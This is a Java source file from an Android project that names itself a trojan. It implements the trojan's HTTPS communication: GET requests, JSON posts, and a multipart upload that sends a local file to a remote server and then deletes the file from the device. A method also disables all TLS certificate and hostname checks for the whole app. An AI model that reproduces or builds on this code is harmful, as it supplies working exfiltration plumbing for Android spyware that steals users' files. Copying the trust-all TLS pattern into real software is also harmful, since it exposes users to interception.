package trojan.android.android_trojan.Action;

import android.util.Log;

import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;
import java.net.ProtocolException;
import java.net.URL;
import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;
import java.security.cert.X509Certificate;

import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSession;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;


public class HttpsURLConnectionHelper implements IHttpURLConnection {
    final static String TAG = HttpsURLConnectionHelper.class.getSimpleName();
    final static boolean acceptAll = true;

    public String getHttp(URL url, String auth) {
        String result = null;
        HttpsURLConnection conn = null;
        acceptAll();

        try {
            conn = (HttpsURLConnection) url.openConnection();
            conn.setReadTimeout(5000);
            conn.setConnectTimeout(5000);
            conn.setRequestMethod("GET");
            if (auth != null)
                conn.setRequestProperty ("Authorization", auth);
            conn.setDoInput(true);
            conn.connect();

            if (conn.getResponseCode() == 200){
                result =  Tools.convertInputStreamToString(conn.getInputStream());
            }

        } catch (ProtocolException e) {
            e.printStackTrace();
        } catch (IOException e) {
            Log.d(TAG, e.getMessage());
        }finally {
            if (conn != null) {
                conn.disconnect();
            }
            return result;
        }
    }

    public String postHttp(URL url, String data, String auth){
        File file = new File(data);
        Log.d(TAG, String.valueOf(file.exists()));
        if (file.exists()){
            return postHttpFile(url, data, auth);
        }else {
            return postHttpJSON(url, data, auth);
        }
    }

    public String postHttpJSON(URL url, String json, String auth){
        String result = null;
        String urlParameters = json;
        HttpsURLConnection conn = null;
        acceptAll();
        try {
            conn = (HttpsURLConnection) url.openConnection();
            conn.setReadTimeout(5000);
            conn.setConnectTimeout(5000);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setRequestProperty("charset", "utf-8");
            conn.setRequestProperty("Accept", "application/json");
            if (auth != null)
                conn.setRequestProperty ("Authorization", auth);
            conn.setDoOutput(true);

            DataOutputStream wr = new DataOutputStream(conn.getOutputStream());
            wr.writeBytes(urlParameters);
            wr.flush();
            wr.close();

            if (conn.getResponseCode() == 200){
                result =  Tools.convertInputStreamToString(conn.getInputStream());
            }

        } catch (ProtocolException e) {
            e.printStackTrace();
        } catch (IOException e) {
            Log.d(TAG, e.getMessage());
        }finally {
            if (conn != null) {
                conn.disconnect();
            }
            return result;
        }
    }

    public String postHttpFile(URL url, String path, String auth){
        File uploadFile = new File(path);
        String result = null;

        if (!uploadFile.exists())
            return result;

        acceptAll();

        HttpsURLConnection conn = null;
        String BOUNDRY = "------------------------e5d0991ba211a5e1";
        String crlf = "\r\n";
        String twoHyphens = "--";

        try {
            conn = (HttpsURLConnection) url.openConnection();
            conn.setDoOutput(true);
            conn.setUseCaches(false);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + BOUNDRY);
            if (auth != null)
                conn.setRequestProperty ("Authorization", auth);

            String contentDisposition = "Content-Disposition: form-data; name=\"filedata\"; filename=\""+uploadFile.getName()+"\"";
            String contentType = "Content-Type: application/octet-stream";

            DataOutputStream dataOutputStream = new DataOutputStream(conn.getOutputStream());
            dataOutputStream.write((twoHyphens + BOUNDRY + crlf).getBytes());
            dataOutputStream.write(contentDisposition.getBytes());
            dataOutputStream.write(crlf.getBytes());
            dataOutputStream.write(contentType.getBytes());
            dataOutputStream.write(crlf.getBytes());
            dataOutputStream.write(crlf.getBytes());
            dataOutputStream.write(Tools.convertFileToByteArray(uploadFile));
            dataOutputStream.write(crlf.getBytes());
            dataOutputStream.write((twoHyphens + BOUNDRY + twoHyphens + crlf).getBytes());
            dataOutputStream.flush();
            dataOutputStream.close();

            if (conn.getResponseCode() == 200){
                result =  Tools.convertInputStreamToString(conn.getInputStream());
            }

        }catch (Exception ex){
            Log.d(TAG, ex.getMessage());
        }finally {
            if (conn != null) {
                conn.disconnect();
                uploadFile.delete();
            }
        }

        return result;
    }

    public static void acceptAll() {
        if (acceptAll){
            try {
                SSLContext ctx = SSLContext.getInstance("TLS");
                ctx.init(null, new TrustManager[] {
                        new X509TrustManager() {
                            public void checkClientTrusted(X509Certificate[] chain, String authType) {}
                            public void checkServerTrusted(X509Certificate[] chain, String authType) {}
                            public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[]{}; }
                        }
                }, null);

                HttpsURLConnection.setDefaultSSLSocketFactory(ctx.getSocketFactory());
                HttpsURLConnection.setDefaultHostnameVerifier(new HostnameVerifier() {
                    public boolean verify(String hostname, SSLSession session) {
                        return true;
                    }
                });
            } catch (NoSuchAlgorithmException e) {
                e.printStackTrace();
            } catch (KeyManagementException e) {
                e.printStackTrace();
            }
        }
    }
}
